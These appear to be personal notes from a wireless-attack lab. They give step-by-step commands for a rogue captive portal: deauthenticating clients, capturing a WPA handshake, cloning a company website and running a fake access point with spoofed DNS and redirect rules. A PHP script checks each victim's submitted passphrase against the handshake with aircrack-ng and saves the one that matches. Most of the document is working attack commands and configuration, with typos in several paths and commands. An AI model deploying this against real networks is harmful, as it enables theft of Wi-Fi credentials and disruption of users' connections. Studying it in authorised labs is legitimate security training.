#################################################################################################################################

Captive portals are often set up on unencrypted or open networks to allow guests or employees to easily connect to the network or Internet, sometimes without credentials.Once connected, the OS browser will often detect there is a captive portal and automatically open a browser to log in. The welcome page sometimes contains rules and conditions or a login/password prompt.

The Captive Portal Attack

Opportunistic Wireless Encryption (OWE), also sometimes called Enhanced Open, can encrypt the connection without requiring a passphrase. This would ensure that credentials sent to us are safe from interception, and while not all devices support it, most modern operating systems do.

airmon-ng check kill
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -w discovery --output-format pcap -c 11 wlan0mon
 
aireplay-ng 0 0 -a <bssid> wlan0mon
airmon-ng stop wlan0mon

BUILDING THE CAPTIVR PORTAL

sudo apt install apache2 libapache2-mod-php
wget -r -l2 https://www.megacorpone.com  (To clone the index and background page )

mkdir /var/www/html/portal
mousepad /ver/www/html/potal/index.php (Copy the code from the downloaded pages)

cp -r ./www.megacorpone.com/assets/  /var/www/html/portal
cp -r ./www.megacorpone.com/old-site/  /var/www/html/portal

mousepad /ver/www/html/potal/login_check.php

"<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>"


NETWORKING SETUP

#assign an IP address to our wlan0 interface

sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up

sudo apt install dnsmasq
mousepad /home/kali/mco-dnsmasq-man.html

"# Main options
# http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
domain-needed
bogus-priv
no-resolv
filterwin2k
expand-hosts
domain=localdomain
local=/localdomain/
# Only listen on this address. When specifying an
# interface, it also listens on localhost.
# We don't want to interrupt any local resolution
# since the DNS responses will be spoofed
listen-address=192.168.87.1

# DHCP range
dhcp-range=192.168.87.100,192.168.87.199,12h
dhcp-lease-max=100# This should cover most queries

# We can add 'log-queries' to log DNS queries
address=/com/192.168.87.1
address=/org/192.168.87.1
address=/net/192.168.87.1

# Entries for Windows 7 and 10 captive portal detection
address=/dns.msftncsi.com/131.107.255.255"



sudo dnsmasq --conf-file=mco-dnsmasq.conf
sudo tail /var/log/syslog | grep dnsmasq (process ID in /var/run/dnsmasq.pid , This will let us find and kill the process when we are done.)
sudo netstat -lnp ( Confirm 


sudo apt install nftables
sudo nft add table ip nat
sudo nft 'add chain nat PREROUTING { type nat hook prerouting priority dstnat; policy accept; }'
sudo nft add rule ip nat PREROUTING iifname "wlan0" udp dport 53 counter redirect to :53


mousepad /etc/apache2/sites-enabled/000-default.conf

"# Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 http://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt http://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt http://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ http://192.168.87.1/portal/index.php [L]

</VirtualHost>"

sudo systemctl restrart apache2
sudo a2enmod rewrite
sudo a2enmod alias


SPECIAL CASE FOR CHROME :

"# Apple
  RewriteEngine on
  RewriteCond %{HTTP_USER_AGENT} ^CaptiveNetworkSupport(.*)$ [NC]
  RewriteCond %{HTTP_HOST} !^192.168.87.1$
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L,R=302]

  # Android
  RedirectMatch 302 /generate_204 https://192.168.87.1/portal/index.php

  # Windows 7 and 10
  RedirectMatch 302 /ncsi.txt https://192.168.87.1/portal/index.php
  RedirectMatch 302 /connecttest.txt https://192.168.87.1/portal/index.php

  # Catch-all rule to redirect other possible attempts
  RewriteCond %{REQUEST_URI} !^/portal/ [NC]
  RewriteRule ^(.*)$ https://192.168.87.1/portal/index.php [L]

</VirtualHost>"
	
  # Use existing snakeoil certificates
  SSLCertificateFile /etc/ssl/certs/ssl-cert-snakeoil.pem
  SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key

sudo a2enmod ssl
sudo systemctl restart apache2

SETTING UP & RUNNING A CAPTIVE PORTAL

apt install host-apd
mousepad mco-hostapd.conf

"interface=wlan0
ssid=MegaCorp One Lab
channel=11

# 802.11n
hw_mode=g
ieee80211n=1

# Uncomment the following lines to use OWE instead of an open network
#wpa=2
#ieee80211w=2
#wpa_key_mgmt=OWE
#rsn_pairwise=CCMP"

sudo hostapd -B mco-hostapd.conf (run hostapd in the background)

Open two terminal windows to inspect the logs and check connections. The first one will show us hostapd and udhcpd logs

sudo tail -f /var/log/syslog | grep -E '(dnsmasq|hostapd)'      ( hostapd and udhcpd logs )
sudo tail -f /var/log/apache2/access.log           (apache2 logs)


Look in the /tmp directory, find our passphrase.txt            
sudo find /tmp/ -iname passphrase.txt
sudo cat /tmp/systemd-private-0a505bfcaf7d4db699274121e3ce3849-apache2.service-lIP3ds/tmp/passphrase.txt

ADDITIONAL BEHAVIOUR (ONLY FOR READING)

For example, Windows will not show the captive portal after automatically connecting to the network. In this situation the user has manually to go into the network list dialog again, select our network, and click Connect for it to work.

In addition, Chrome doesn't automatically check for captive portals upon startup. It only detects them when manually typing a URL or doing a search.  


